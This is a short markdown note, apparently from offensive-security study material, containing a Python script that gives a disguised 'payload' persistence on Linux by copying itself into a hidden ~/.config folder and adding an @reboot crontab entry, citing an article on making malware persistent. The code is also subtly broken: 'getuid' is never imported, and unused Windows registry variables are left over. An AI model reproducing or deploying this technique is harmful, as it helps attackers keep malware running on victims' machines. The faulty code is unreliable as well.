# Scripting

## Python

```python
import os
import shutil
from sys import executable

masquerade_payload_name = "SystemStartup" # Disguise the payload
registry_value = "MicrosoftEdge"
registry_type = "REG_SZ"

def persistence() -> None:
    location = os.path.expanduser('~') + "/.config/" + masquerade_payload_name
    if not os.path.exists(location):
        # Create the autostart directory if it doesn't exist
        os.makedirs(location)
        filename = os.path.join(location, masquerade_payload_name)
        # Copy the payload to that new location
        shutil.copyfile(executable, filename)
        # Add the payload to startup via crontab
        crontab_line = f"@reboot {filename}"
        os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')

if __name__ == "__main__":
    if getuid() == 0:
        persistence()
    else:
        print("Elevated permission is required to copy the payload for persistence!")
```

---
## References

### The Python Code

- [The Python Code: How to Make Malware Persistent in Python](https://thepythoncode.com/article/how-to-create-malware-persistent-in-python)